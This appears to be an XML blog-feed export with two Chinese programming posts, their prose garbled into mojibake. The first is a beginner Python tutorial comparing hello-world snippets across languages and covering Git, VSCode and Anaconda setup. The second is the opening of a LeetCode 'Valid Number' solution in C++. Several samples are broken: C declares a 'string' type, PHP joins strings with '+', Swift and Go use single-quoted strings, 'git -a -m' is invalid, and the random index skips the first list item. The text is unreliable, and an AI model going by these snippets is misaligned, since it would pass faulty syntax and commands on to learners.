 language = &#x27;Python&#x27;print(&#x27;My favorite Language is &#123;&#125;&#x27;.format(language))

C ç¶“å…¸çš„å‚³çµ±ä¸»åŠ›ç¨‹å¼èªè¨€ï¼Œé©ç”¨æ–¼éœ€è¦æ•ˆèƒ½é‡è¦–é€Ÿåº¦çš„æ‡‰ç”¨ï¼Œå¯ä»¥æ“ä½œè¨±å¤šå°ç´°ç¯€ï¼Œä½†å­¸ç¿’é–€æª»ç¨å¾®é«˜ä¸€äº›ï¼ŒåŸ·è¡Œå‰éœ€è¦äº‹å…ˆç·¨è­¯å®Œæˆï¼š
 #include &lt;stdio.h&gt;int main(int atgc, char *argv[]) &#123;    string language = &quot;C++&quot;;    printf(&quot;My favorite Language is %s&quot;, language);    return 0;&#125;

C++ å±¬æ–¼ C å®¶æ—æˆå“¡ï¼Œå…·å‚™ç‰©ä»¶å°å‘ç‰¹æ€§ï¼ŒåŒæ¨£æ˜¯é©ç”¨æ–¼éœ€è¦æ•ˆèƒ½é‡è¦–é€Ÿåº¦å’Œæ“ä½œåº•å±¤éŸŒé«”ã€ç¡¬é«”çš„å¥½é¸æ“‡ï¼š
 #include &lt;iostream&gt;using namespace std;int main() &#123;    string language = &quot;C++&quot;;    cout &lt;&lt; &quot;My favorite Language is &quot; &lt;&lt; language;    return(0);&#125;

Java å¸¸è¦‹æ–¼ä¼æ¥­ç³»çµ±å’Œ Android è¡Œå‹•æ‡‰ç”¨é–‹ç™¼çš„ Java æ˜¯ç‰©ä»¶å°å‘ç¨‹å¼èªè¨€ï¼Œç”±æ–¼è·¨å¹³å°é–‹ç™¼ç­‰ç‰¹æ€§è®“ Java ä¸€ç›´æ˜¯å¸‚å ´è »ç†±é–€çš„èªè¨€ã€‚
 public class CodeLanguage &#123;    public static void main(String[] args) &#123;        string language = &quot;Java&quot;;        System.out.format(&quot;My favorite Language is %s&quot;, language);    &#125;&#125;

C# ç”±å¾®è»Ÿæ¨å‡ºå¸æ”¶äº† C++&#x2F;Java ç­‰å„ªé»çš„ç‰©ä»¶å°å‘ç¨‹å¼èªè¨€ï¼Œå¸¸è¦‹æ–¼é–‹ç™¼å¾®è»Ÿå¹³å°ç›¸é—œçš„æ‡‰ç”¨ç¨‹å¼ã€‚
 using System;namespace CodeLanguage &#123;    class CodeLanguage &#123;        static void Main() &#123;            string language = &quot;C#&quot;;            Console.WriteLine(&quot;My favorite Language is &#123;&#125;&quot;, language);        &#125;    &#125;&#125;

JavaScript éš¨è‘—ç‰ˆæœ¬æ¼”é€²å’Œ Node.js çš„æ¨å‡ºå¾Œå¾ç©å…·èªè¨€åˆ°å¯ä»¥æŒ‘å¤§æ¨‘çš„ç¨‹å¼èªè¨€ï¼Œæ‡‰ç”¨ç¯„åœéåŠç¶²é å‰å¾Œç«¯é–‹ç™¼ã€éŠæˆ²é–‹ç™¼ã€ç‰©è¯ç¶²ç¨‹å¼é–‹ç™¼ã€æ‰‹æ©Ÿç¨‹å¼é–‹ç™¼ç­‰ã€‚æ˜¯ç¨‹å¼è¨­è¨ˆå¸«ç¤¾ç¾¤å¹³å° Github å’Œç¨‹å¼å•ç­”å¹³å° StackOverflow ä¸Šæœ€å—æ­¡è¿çš„ç¨‹å¼èªè¨€ä¹‹ä¸€ã€‚ä¸”ç”±æ–¼æ‡‰ç”¨ç¯„åœå»£æ³›ï¼Œç¨‹å¼æ±Ÿæ¹–æ›´å‚³è¨€ï¼šå¯ä»¥ä½¿ç”¨ JavaScript ç·¨å¯«çš„ç¨‹å¼ï¼Œæœ€çµ‚éƒ½æœƒå‡ºç¾ JavaScript ç‰ˆæœ¬ã€‚
 var language = &#x27;JavaScript&#x27;console.log(&#x27;My My favorite Language is &#x27; + language);

PHP å¸æ”¶äº† C&#x2F;Java&#x2F;Perl ç‰¹é»çš„ç¶²ç«™é–‹ç™¼ä¸»åŠ›èªè¨€ï¼Œä¸–ç•Œä¸Šæœ‰è¨±å¤šçš„ç¶²ç«™éƒ½æ˜¯ä½¿ç”¨ PHP é€²è¡Œé–‹ç™¼ã€‚
 &lt;?php    $language = &#x27;PHP&#x27;;    echo &#x27;My favorite Language is &#x27; + language;?&gt;

Ruby å¸¸è¦‹æ–¼ç¶²é  Web é–‹ç™¼ï¼Œä»¥ Ruby on Rails Web é–‹ç™¼æ¡†æ¶èåæ–¼ç¨‹å¼è¨­è¨ˆç¤¾ç¾¤ã€‚
 language = &#x27;Ruby&#x27;puts &#x27;My favorite Language is #&#123;language&#125;&#x27;

Swift ç”± Apple æ¨å‡ºçš„æ¨å‡ºçš„ç¨‹å¼èªè¨€ï¼Œä¸»è¦ç”¨æ–¼é–‹ç™¼ iOS&#x2F;Mac ç³»åˆ—ç”¢å“ï¼Œæ‡‰ç”¨ç¯„åœä¹Ÿæ¶‰åŠåˆ°äº†ä¼ºæœå™¨ç«¯é–‹ç™¼ï¼ˆServerï¼‰ã€‚
 let language = &#x27;Swift&#x27;print(&quot;My favorite Language is &quot;, language)

Goç”± Google æ¨å‡ºçš„ç¨‹å¼èªè¨€ï¼Œé©åˆç”¨æ–¼å¹³è¡ŒåŒ–ç¨‹å¼é–‹ç™¼ã€‚
package mainimport &quot;fmt&quot;func main() &#123;    language := &#x27;Go&#x27;    fmt.Printf(&quot;My favorite Language is %s&quot;, language)&#125;

çœ‹å®Œäº†çœ¾å¤šèªè¨€æ˜¯ä¸æ˜¯ç™¼ç¾å…¶å¯¦ Python èªæ³•é‚„è »å¯æ„›å¹³æ˜“è¿‘äººçš„å‘¢ï¼Ÿäº‹å¯¦ä¸Šï¼Œä¸–ç•Œä¸Šæ²’æœ‰æœ€å¥½çš„ç¨‹å¼èªè¨€ï¼Œåªæœ‰æœ€é©åˆçš„ä½¿ç”¨åœ°æ–¹ã€‚æ¥ä¸‹ä¾†æˆ‘å€‘å°‡é€é Python å­¸ç¿’ç¨‹å¼è¨­è¨ˆæ€ç¶­ã€‚
Python ç’°å¢ƒå»ºç½®åœ¨é–‹å§‹ä¹‹å‰æˆ‘å€‘å¿…é ˆå…ˆå»ºç½®ç›¸é—œçš„é–‹ç™¼ç’°å¢ƒï¼Œè®“è‡ªå·±å¾éº»ç“œï¼ˆä¸æœƒå¯«ç¨‹å¼çš„äººï¼‰è®Šæˆæ“æœ‰ç¨‹å¼é­”åŠ›çš„é­”æ³•å¸«ã€‚
æ‰€è¬‚å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ï¼Œè¦é–‹ç™¼å¥½çš„æ‡‰ç”¨ç¨‹å¼å¿…é ˆå…ˆæº–å‚™å¥½é–‹ç™¼ç’°å¢ƒæ‰è¡Œã€‚ä»¥ä¸‹ä»‹ç´¹æˆ‘å€‘åœ¨æ¥ä¸‹ä¾†é–‹ç™¼ Python Flask Web æ‡‰ç”¨ç¨‹å¼æ‰€éœ€è¦å®‰è£çš„é–‹ç™¼ç’°å¢ƒå·¥å…·ï¼ˆä»¥ä¸‹ä»¥ Mac OS ç­‰ Unix-like ä½œæ¥­ç³»çµ±ç‚ºç¤ºç¯„ï¼Œè‹¥æ˜¯ Windows ä½¿ç”¨è€…å»ºè­°å®‰è£ Virtualbox ä¸¦é‹è¡Œ Linux Ubuntu ä½œæ¥­ç³»çµ±ï¼Œåƒè€ƒå®‰è£æ–‡ä»¶ï¼‰ï¼š

Microsoft VSCode ç·¨è¼¯å™¨ Microsoft VSCode æ˜¯ Microsoft æ¨å‡ºçš„ç·¨è¼¯å™¨ï¼ˆéæ•´åˆé–‹ç™¼ç’°å¢ƒ IDEï¼‰ï¼Œå¤¾å¸¶è‘— Microsoft éå»æ‰“é€  Visual studio æ•´åˆé–‹ç™¼ç’°å¢ƒçš„è±å¯Œç¶“é©—ï¼Œç›¸æ¯” Sublime Text å’Œå…¶ä»–ç·¨è¼¯å™¨ï¼ŒVSCode çš„å„ªå‹¢åœ¨æ–¼é–‹æºä¸”æ´»èºçš„é–‹ç™¼ç¤¾ç¾¤ã€å…§å»º debugger æ¡†æ¶ã€åŸç”Ÿ Git æ•´åˆã€å¥—ä»¶æ•´åˆå®¹æ˜“ç­‰ç‰¹æ€§ã€‚æ‰€ä»¥å°æ–¼åˆå­¸è€…ä¾†èªª VSCode æ˜¯ä¸€å€‹è »é©åˆå…¥é–€çš„é–‹ç™¼ç’°å¢ƒã€‚å®ƒçš„å®‰è£æ–¹å¼ä¹Ÿååˆ†ç°¡æ˜“ï¼Œåœ¨å®˜ç¶²ä¸‹è¼‰å¾ŒæŒ‰ç…§æŒ‡ç¤ºå®‰è£å®Œæˆå³å¯ã€‚
  
 æˆ‘å€‘å¯ä»¥å®‰è£ Python èªæ³•å’Œæ ¼å¼æª¢æŸ¥çš„ç›¸é—œ Python å¥—ä»¶å¹«åŠ©é™¤éŒ¯ï¼š
  

çµ‚ç«¯æ©Ÿç’°å¢ƒï¼ˆiTterm&#x2F;å…§å»º terminalï¼‰ terminalï¼ˆçµ‚ç«¯æ©Ÿï¼‰æ˜¯æˆ‘å€‘ä¸‹æŒ‡ä»¤çš„åœ°æ–¹ï¼Œè¨±å¤šæ™‚å€™æˆ‘å€‘é€²è¡Œç¨‹å¼é–‹ç™¼æ™‚ä¸æœƒä½¿ç”¨ GUI çš„ä»‹é¢è€Œæ˜¯ä½¿ç”¨ä¸‹æŒ‡ä»¤æ–¹å¼è«‹é›»è…¦åšç›¸å°æ‡‰çš„è¡Œç‚ºã€‚åœ¨ Linux å’Œ Mac è£¡é¢éƒ½æœ‰å…§å»ºçš„ terminal çš„æ‡‰ç”¨ç¨‹å¼ï¼Œè‹¥ä½ æ˜¯ Mac ç”¨æˆ¶æƒ³ä½¿ç”¨æ›´ä¾¿åˆ©çš„å·¥å…·ï¼ˆåˆ†å‰²è¦–çª—ã€ç†±éµã€æœå°‹ã€è‡ªå‹•è£œå®Œç­‰ï¼‰å¯ä»¥é¡å¤–å®‰è£ iterm2 åšä½¿ç”¨ã€‚è‹¥æ˜¯ä¸æƒ³ä½¿ç”¨ Virtualboxï¼Œä½¿ç”¨ Windows è®€è€…å¯ä»¥ä½¿ç”¨ Cmder é€™å€‹è»Ÿé«”ç•¶åšçµ‚ç«¯æ©Ÿç’°å¢ƒã€‚
  
 ä¸‹æŒ‡ä»¤ï¼ˆ$ ç‚ºæç¤ºå­—å…ƒï¼Œä¸ç”¨è¼¸å…¥ï¼‰ï¼š
  
 å°æ–¼æœ‰å¿—æ–¼å¾äº‹ç¨‹å¼é–‹ç™¼ç›¸é—œå·¥ä½œçš„è®€è€…å»ºè­°å¯ä»¥å¤šç†Ÿæ‚‰æŒ‡ä»¤ç¢¼çš„è¼¸å…¥ï¼Œæ›´å¤šæŒ‡ä»¤ç¢¼å¯ä»¥åƒè€ƒé³¥å“¥æ’°å¯«çš„ Linux åŸºæœ¬æŒ‡ä»¤ä»‹ç´¹ å’Œ Linux å­¸ç¿’è³‡æºã€‚

Git ç‰ˆæœ¬æ§åˆ¶ç³»çµ±&#x2F;è¨»å†Š GitHub å¸³æˆ¶ Git æ˜¯ä¸€ç¨®åˆ†æ•£å¼ç‰ˆæœ¬æ§åˆ¶ç³»çµ±ï¼Œå¯ä»¥è®“æˆ‘å€‘å¯ä»¥æ›´æ–¹ä¾¿åœ°ç®¡ç†æˆ‘å€‘çš„ç¨‹å¼ç¢¼ã€‚åœ¨ç¶²è·¯ä¸Šæœ‰éå¸¸å¤šå„ªç§€çš„ Git æ•™å­¸æ–‡ä»¶ï¼ˆé€£çŒ´å­éƒ½èƒ½æ‡‚çš„Gitå…¥é–€æŒ‡å—ã€å¯«çµ¦å¤§å®¶çš„ Git æ•™å­¸ã€åˆå¿ƒè€… Git ä¸Šæ‰‹æ”»ç•¥ï¼‰ã€‚å®‰è£ Git æ–¹å¼æ˜¯åˆ°å®˜ç¶²ä¸‹è¼‰è»Ÿé«”ï¼Œä¾ç…§æŒ‡ç¤ºå®‰è£ã€‚
  
 äº’å‹•å¼èªæ³•å­¸ç¿’ï¼š
  
 åœ¨ä»‹ç´¹å®Œ git ä¹‹å¾Œæˆ‘å€‘ä¾†äº†è§£ä¸€ä¸‹ GitHubã€‚GitHub æ˜¯ä¸€å€‹å¯ä»¥å­˜æ”¾ git ç¨‹å¼ç¢¼å°ˆæ¡ˆçš„å¹³å°ï¼Œé€é GitHub æˆ‘å€‘å¯ä»¥æ¥è§¸åˆ°æœ€æ–°çš„é–‹æ”¾åŸå§‹ç¢¼è³‡è¨Šï¼Œä¹Ÿå¯ä»¥å°‡æˆ‘å€‘çš„ç¨‹å¼ç¢¼é–‹æºå‡ºä¾†ã€‚
  
 å¾ GitHub ä¸Šè¤‡è£½ç¨‹å¼ç¢¼
  
 # è¤‡è£½ä¸€ä»½åˆ°æœ¬åœ°ç«¯$ git clone https://github.com/kdchang/flask101.git# ç§»å‹•åˆ°è³‡æ–™å¤¾$ cd flask101

 å¸¸è¦‹ Git æŒ‡ä»¤ï¼š
 # åˆå§‹åŒ–å°ˆæ¡ˆ$ git init# æŸ¥çœ‹ç‹€æ…‹$ git status# æª¢æŸ¥å·®ç•°$ git diff # å°‡è®Šæ›´æª”æ¡ˆæ”¾å…¥æš«å­˜å€$ git add index.py# ä½¿ç”¨ commit -m æäº¤è®Šæ›´$ git -a -m &#x27;init commit&#x27;# æŸ¥çœ‹æ­·å²$ git log# æ”¾æ£„å·²ç¶“ commit çš„æª”æ¡ˆé‡å›æš«å­˜å€$ git reset HEAD index.py# æ”¾æ£„æª”æ¡ˆè®Šæ›´$ git checkout index.py

Anaconda Python3 ç‰ˆæœ¬ Anaconda æ˜¯ä¸€å€‹ all-in-one çš„ Python é–‹ç™¼ç’°å¢ƒï¼Œå°æ–¼åˆå­¸è€…ä¾†èªªæ˜¯å€‹ååˆ†åˆé©çš„é–‹ç™¼ç’°å¢ƒåŒ…ã€‚Anaconda å…·å‚™äº†å¹¾é …ç‰¹é»ï¼š

ä¾¿æ–¼å®‰è£è¨±å¤šæµè¡Œçš„ç§‘å­¸ã€æ•¸å­¸ã€å·¥ç¨‹ã€æ•¸æ“šåˆ†æçš„ Python æ¨¡çµ„  
é–‹æºå’Œå…è²»
è·¨å¹³å°æ”¯æŒï¼šLinuxã€Windowsã€Mac
æ”¯æŒ Python ç‰ˆæœ¬åˆ‡æ›ï¼Œæ–¹ä¾¿å»ºç«‹ä¸åŒçš„è™›æ“¬é–‹ç™¼ç’°å¢ƒ
å…§å»º Spyder ç·¨è¼¯å™¨å’Œ Jupyter Notebook ç’°å¢ƒ

 å®‰è£æµç¨‹ä¹Ÿååˆ†ç°¡å–®ï¼Œé€²å…¥ Anaconda é¦–é ï¼Œé¸æ“‡å°æ‡‰ä½œæ¥­ç³»çµ±ï¼ˆé€™é‚Šä½¿ç”¨ Mac OSï¼‰ï¼š 
 é¸æ“‡å°æ‡‰ Python ç‰ˆæœ¬ä¸‹è¼‰ï¼Œæˆ‘å€‘ä½¿ç”¨ Graphical Installerï¼ˆåœ–åƒä»‹é¢å®‰è£æ–¹å¼ï¼‰ï¼Œæ¥è‘—åœ¨ä¸‹è¼‰å®Œæˆæ™‚æŒ‰ç…§é è¨­çš„å®‰è£æ–¹å¼å®Œæˆå®‰è£ï¼›  
 è‹¥æ˜¯å®Œæ•´å®‰è£æˆåŠŸï¼Œå¯ä»¥æ‰“é–‹çµ‚ç«¯æ©Ÿè¼¸å…¥ï¼Œè‹¥æ˜¯é¡¯ç¤º Python 3.6.0 :: Anaconda 4.3.0 (x86_64) ç‰ˆæœ¬è™Ÿå³å®‰è£æˆåŠŸï¼š
 $ python -VPython 3.6.0 :: Anaconda 4.3.0 (x86_64)

 æ¥è‘—è¦å»ºç«‹æˆ‘å€‘å°ˆæ¡ˆè™›æ“¬ç’°å¢ƒï¼Œé€™æ¨£åœ¨å®‰è£æ“ä½œå¥—ä»¶æ™‚æ¯”è¼ƒä¸å®¹æ˜“è¢«æ±¡æŸ“åˆ° root çš„ç’°å¢ƒï¼Œå•Ÿå‹•å¾Œæœƒå‡ºç¾ï¼ˆå¥—ä»¶åç¨±ï¼‰çš„æç¤ºå­—å…ƒï¼š
 # é¡¯ç¤ºç›®å‰è™›æ“¬ç’°å¢ƒåˆ—è¡¨$ conda info -e # å‰µå»ºè™›æ“¬ç’°å¢ƒ$ conda create -n å¥—ä»¶åç¨± python=3.6# é€²å…¥è™›æ“¬ç’°å¢ƒï¼ˆè‹¥æ˜¯ Windows cmder ç’°å¢ƒä¸ç”¨åŠ  sourceï¼‰ ï¼ŒæˆåŠŸå¾Œæç¤ºå­—å…ƒè®Šæˆï¼šï¼ˆå¥—ä»¶åç¨±ï¼‰$$ source activate å¥—ä»¶åç¨±# é›¢é–‹è™›æ“¬ç’°å¢ƒï¼ˆè‹¥æ˜¯ Windows cmder ç’°å¢ƒä¸ç”¨åŠ  sourceï¼‰ $ source deactivate 

å»ºç«‹è™›æ“¬ç’°å¢ƒåœ¨å»ºç«‹ç›¸é—œé–‹ç™¼å·¥å…·å¾Œæˆ‘å€‘æ­£å¼ä¾†å»ºç«‹ä¸€å€‹ Python çš„å°ˆæ¡ˆï¼š
æ‰“é–‹çµ‚ç«¯æ©Ÿç§»å‹•åˆ°æ¡Œé¢ï¼Œå»ºç«‹å°ˆæ¡ˆè³‡æ–™å¤¾
$ cd ~/Desktop$ mkdir python_examples$ cd python_examples

å»ºç«‹ç¨ç«‹è™›æ“¬ç’°å¢ƒï¼Œä¸¦é€²å…¥è™›æ“¬ç’°å¢ƒï¼š
$ conda create -n python_examples_venv python$ source activate python_examples_venv

æˆåŠŸé€²å…¥è™›æ“¬ç’°å¢ƒå¾Œ
ä½ çš„ç¬¬ä¸€å€‹ Python ç¨‹å¼ä¸€èˆ¬è€Œè¨€æˆ‘å€‘æœƒä½¿ç”¨ç·¨è¼¯å™¨æˆ–æ˜¯æ•´åˆé–‹ç™¼ç’°å¢ƒï¼ˆIDEï¼‰é€²è¡Œç¨‹å¼æ’°å¯«ï¼Œç„¶å¾Œåœ¨çµ‚ç«¯æ©Ÿä¸‹æŒ‡ä»¤åŸ·è¡Œç¨‹å¼ã€‚ç•¶ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨çµ‚ç«¯æ©Ÿä¸Šä½¿ç”¨å…§å»ºäº’å‹•å¼ä»‹é¢æˆ–æ˜¯ jupyter notebook é€²è¡Œã€‚ä»¥ä¸‹æ˜¯æˆ‘å€‘è¦ä»‹ç´¹çµ¦å¤§å®¶çš„ç°¡å–®ç¯„ä¾‹ï¼Œç¬¬ä¸€å€‹æ˜¯éš¨æ©Ÿå°å‡ºä¸åŒçš„å–œæ„›ç¨‹å¼èªè¨€ï¼Œç¬¬äºŒå€‹æ˜¯ä½¿ç”¨ç¬¬ä¸‰æ–¹å¥—ä»¶æ“·å–æ”¿åºœå…¬é–‹è³‡æ–™ã€‚ç¨‹å¼è¨­è¨ˆå”¯æœ‰å‹•æ‰‹å¯¦éš›æ“ä½œå’Œå¯¦è¸æ‰èƒ½å­¸çš„å¥½ï¼Œå¸Œæœ›è®€è€…æ‰“é–‹ä½ çš„ç·¨è¼¯å™¨é€éè‡ªå·±å¯¦ä½œå»ç†Ÿæ‚‰ Python ç¨‹å¼æ’°å¯«ï¼š
éš¨æ©Ÿå°å‡ºä¸åŒçš„å–œæ„›ç¨‹å¼èªè¨€ï¼š

å¼•å…¥ random å¥—ä»¶
å®šç¾© language è®Šæ•¸ï¼Œä¸¦å°‡å„²å­˜ç¨‹å¼èªè¨€å­—ä¸²çš„ä¸²åˆ—ï¼ˆlistï¼‰è³‡æ–™çµæ§‹çµ¦å®šçµ¦è®Šæ•¸
ç”¢ç”Ÿ 1 åˆ° 2 ä¹‹é–“çš„éš¨æ©Ÿæ•´æ•¸
åˆ—å°å‡ºæœ€å–œæ­¡çš„ç¨‹å¼èªè¨€å­—ä¸²ï¼ˆå«æ ¹æ“šéš¨æ©Ÿç”¢ç”Ÿçš„ index é¸å–åˆ°çš„ä¸²åˆ—å€¼ï¼‰

favorite_language.pyimport randomlanguage = [&#x27;Python&#x27;, &#x27;JavaScript&#x27;, &#x27;Java&#x27;]rnd = random.randint(1, 2)print(&#x27;My favorite Language is&#x27; + language[rnd])

å¯ä»¥åœ¨çµ‚ç«¯æ©Ÿç§»å‹•åˆ°æª”æ¡ˆè³‡æ–™å¤¾åŸ·è¡Œç¨‹å¼æª”æ¡ˆï¼Œä¾‹å¦‚ï¼š
python favorite_language.py

ä½¿ç”¨ç¬¬ä¸‰æ–¹å¥—ä»¶æ“·å–æ”¿åºœå…¬é–‹è³‡æ–™ï¼š

å¼•å…¥ requests å¥—ä»¶
çˆ¬å–æ”¿åºœå…¬é–‹ Wifi ç†±é»è³‡æ–™ï¼Œå°‡å–å¾—è³‡æ–™å›æ‡‰çµ¦å®šçµ¦ response è®Šæ•¸
å°‡è³‡æ–™è½‰æ›æˆä»¥ &#123; &quot;key&quot;: &quot;value &quot;&#125; å½¢å¼çš„ json æ ¼å¼
å°å‡ºå–å¾—çš„è³‡æ–™

wifi_data.pyimport requestsurl = &#x27;http://data.taipei/opendata/datalist/apiAccess?scope=resourceAquire&amp;rid=b087af42-2c54-4dbf-86c8-427d788779e5&#x27;response = requests.get(url)data = response.json()print(data)

ç¸½çµä»¥ä¸Šå°±æ˜¯ç¨‹å¼è¨­è¨ˆæ€ç¶­å…¥é–€ç°¡ä»‹ï¼Œé€éäº†è§£ä»€éº¼æ˜¯ç¨‹å¼è¨­è¨ˆæ€ç¶­å’Œä¸åŒèªè¨€çš„ç‰¹æ€§ã€‚ç•¶ç„¶ï¼Œç¶²è·¯ä¸Šä¹Ÿæœ‰è¨±å¤šå­¸ç¿’è³‡æºå¯ä»¥ç•¶åšåƒè€ƒã€‚
ï¼ˆimage via mshcdnï¼‰
å»¶ä¼¸é–±è®€
Python å®˜ç¶²
JavaScript ç¨‹å¼è¨­è¨ˆ
Python Web ç¨‹å¼è¨­è¨ˆ
éæœ¬ç§‘ç”Ÿï¼Œæˆ‘æƒ³åŠè·¯å‡ºå®¶å­¸å¯«ç¨‹å¼ï¼Œè©²å¦‚ä½•é–‹å§‹ï¼Ÿ
è‡ªå­¸ç¨‹å¼è¨­è¨ˆå­¸ç¿’è³‡æºæ‡¶äººåŒ…
CS50
CS50 TV

é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Python</tag>
        <tag>Django</tag>
        <tag>MVC</tag>
      </tags>
  </entry>
  <entry>
    <title>è¨˜ä¸€æ¬¡ Leetcode åˆ·é¡Œé«”æ‚Ÿ - Valid Number</title>
    <url>/2019/08/03/leetcode-comprehension-valid-number/</url>
    <content><![CDATA[å‰è¨€èº«åœ¨å¤§ CS æ™‚ä»£ï¼Œå¯èƒ½å¾ˆå¤šäººæœ‰åˆ·é¡Œçš„ç¶“é©—ï¼Œä¹Ÿå¯èƒ½åƒç­†è€…ä¸€æ¨£æ­£ç¶“æ­·åˆ· Hard é¡Œçš„å„ç¨®æ’ç‰†ã€‚ä½†åœ¨é€™ç¨®æ’ç‰†çš„æ™‚åˆ»ï¼Œæˆ‘å€‘åè€Œå¯ä»¥ä¾†è§€å¯Ÿè‡ªå·±çš„æ€è€ƒæ–¹å¼æ˜¯ä¸æ˜¯æœ‰å•é¡Œï¼Œæ‰æœƒå°è‡´æ’ç‰†ã€‚
ä»Šå¤©ï¼Œå°±è®“æˆ‘å€‘ä¸€èµ·ä¾†çœ‹ä¸€é¡Œä»¤è¨±å¤šäººæŠ“ç‹‚çš„ valid numberã€‚
é¡Œç›®ä»‹ç´¹ - Valid Numberé¡Œç›®æ•˜è¿°å¦‚ä¸‹ï¼š

åŸºæœ¬ä¸Šå°±æ˜¯è¦åˆ¤æ–·ä¸€å€‹å­—ä¸²æ˜¯ä¸æ˜¯å¯ä»¥è¢«ç•¶ä½œä¸€å€‹æ•¸å­—ã€‚å¦‚æœä½ è©¦è‘—å»è§£è§£çœ‹é€™é¡Œï¼Œä½ å¯èƒ½æœƒç™¼ç¾ä¸€ä»¶äº‹ï¼Œå°±æ˜¯ä½ å¾ˆå®¹æ˜“ä¸æ–·æ¼è€ƒæ…®ä¸€äº› caseã€‚ä½†ä½ ä¸å­¤å–®ï¼Œåªè¦çœ‹çœ‹é€™é¡Œç²¾ç¾çš„é€šéç‡å’Œ dislike æ•¸å°±å¯è¦‹ä¸€ç­XD


ä½†å¦‚æœæˆ‘å€‘ä¹Ÿåƒå¤§å®¶ä¸€æ¨£è¦ºå¾—é€™é¡Œå‡ºå¾—å¾ˆçˆ›å°±ä¸æƒ³å­¸ï¼Œé‚£å°±éå¸¸å¯æƒœäº†ã€‚å› ç‚ºå¦‚æœä½ å …æŒä¸‹å»ï¼Œæœƒçœ‹åˆ°å¾ˆä¸ä¸€æ¨£çš„é¢¨æ™¯ã€‚æ¥ä¸‹ä¾†ï¼Œå°±è®“æˆ‘å€‘ä¸€èµ·çœ‹ä¸‹å»ã€‚
è§£æ³•ä¸€ - å°‡å„éšæ®µåˆ†é¡å¥½æ¼¸é€²è™•ç†é€™ç¨®é¡Œç›®æœ€éº»ç…©çš„åœ°æ–¹å°±åœ¨æ–¼ï¼Œå¦‚æœæ²’æœ‰æŠŠè¦å‰‡æƒ³å¥½ï¼Œå°±æœƒæ¶µè“‹ä¸åˆ°ä¸€äº› edge casesï¼Œé€²è€Œç‚ºäº†è™•ç†é€™äº›å¥‡æ€ª case ä½¿å¾—é‚è¼¯è®Šå¾—å¾ˆæ··äº‚ï¼Œç”šè‡³æœƒç™¼ç”Ÿä¿®äº† A bug çµæœåˆç”¢ç”Ÿ b è·Ÿ c bug çš„æ…˜æ³ã€‚
æ‰€ä»¥åœ¨æœ‰æ¨¡ç³Šçš„æ¦‚å¿µå°±é–‹å§‹å¯« code ä¹‹å‰ï¼Œæˆ‘å€‘å¯ä»¥å…ˆæƒ³æƒ³åˆç†çš„ case æ‡‰è©²è¦é•·ä»€éº¼æ¨£å­ï¼Œå…ˆå¯«å‡ºç¬¬ä¸€ç‰ˆçš„ valid patternï¼ˆ[] è£¡é¢è¡¨ç¤ºæ˜¯ optionalï¼Œé¡ä¼¼ linux command line tool çš„èªªæ˜ï¼‰ï¼š
[+/-] æ•¸å­—(å¯ä»¥æ˜¯å°æ•¸) [eæ•¸å­—(ä¸èƒ½æ˜¯å°æ•¸)]

è€Œä¸å±¬æ–¼é€™å€‹ valid pattern çš„å…¶ä»–å­—ä¸²éƒ½è¦–ç‚º invalidã€‚
æ¥ä¸‹ä¾†æˆ‘å€‘å¯ä»¥ç”¨é¡Œç›®ä¸­æä¾›çš„ test cases æª¢è¦–ä¸€ä¸‹æˆ‘å€‘çš„ pattern æ˜¯å¦å·²ç¶“è¶³å¤ ï¼Œæœƒç™¼ç¾æœ‰å¹¾å€‹ä¾‹å­æ²’æœ‰è¢«æ¶µè“‹åˆ°ï¼š

â€œ 0.1 â€œ &#x3D;&gt; true (æœ€å‰é¢è·Ÿæœ€å¾Œé¢éƒ½å¯ä»¥æœ‰ space)
â€œ 6e-1â€ &#x3D;&gt; true (e å¾Œé¢çš„æ•¸å­—å¯ä»¥æœ‰ +&#x2F;-)

[spaces][+/-]æ•¸å­—(å¯ä»¥æ˜¯å°æ•¸)[e[+/-]æ•¸å­—(ä¸èƒ½æ˜¯å°æ•¸)][spaces]

æ‰€ä»¥æˆ‘å€‘çš„é‚è¼¯æ‡‰è©²è¦ä¾åºè™•ç†ï¼š

Skip spaces
Check â€˜+â€™&#x2F;â€˜-â€˜
Check digital(can contain â€œ.â€)
Check exponenta. Check â€˜+â€™&#x2F;â€˜-â€˜b. Check digital(cannot contain â€œ.â€)
Check space

é€™æ™‚å†é–‹å§‹å¯«ç¨‹å¼ï¼Œå°±è¦ºå¾—é‚è¼¯æ¸…æ™°ï¼Œè¼•èˆŸå·²éè¬èŸ²å±±ï¼š
class Solution &#123;public:  bool isNumber(string s) &#123;    int i=0;        // Skip the spaces    for(; s[i] == &#x27; &#x27;; i++) &#123;&#125;        // Check for &#x27;+&#x27;/&#x27;-&#x27;    if(s[i] == &#x27;+&#x27; || s[i] == &#x27;-&#x27;) i++;        // Check digital    int num, pt;    for(num=0, pt=0; (s[i]&lt;=&#x27;9&#x27; &amp;&amp; s[i]&gt;=&#x27;0&#x27;) || s[i]==&#x27;.&#x27;; i++)      s[i] == &#x27;.&#x27; ? pt++ : num++;        if(pt&gt;1 || num&lt;1) // no more than one point, at least one digit    return false;        // Check exponent    if(s[i] == &#x27;e&#x27;) &#123;      i++;      // Check &#x27;+&#x27;/&#x27;-&#x27;      if(s[i] == &#x27;+&#x27; || s[i] == &#x27;-&#x27;) i++;      // Check digital(cannot contain &quot;.&quot;)      for(num=0; (s[i]&lt;=&#x27;9&#x27; &amp;&amp; s[i]&gt;=&#x27;0&#x27;); i++, num++) &#123;&#125;      if(num&lt;1) // at least one digit        return false;    &#125;        // Skip spaces    for(; s[i] == &#x27; &#x27;; i++) &#123;&#125;        // must reach the end of string    return s[i]==&#x27;\0&#x27;;  &#125;&#125;;

ä½†åˆ°é€™é‚Šé‚„æ²’å®Œï¼Œæˆ‘å€‘é‚„å¯ä»¥å°é€™é¡ŒæŒ–å¾—æ›´åŠ æ·±å…¥ã€‚
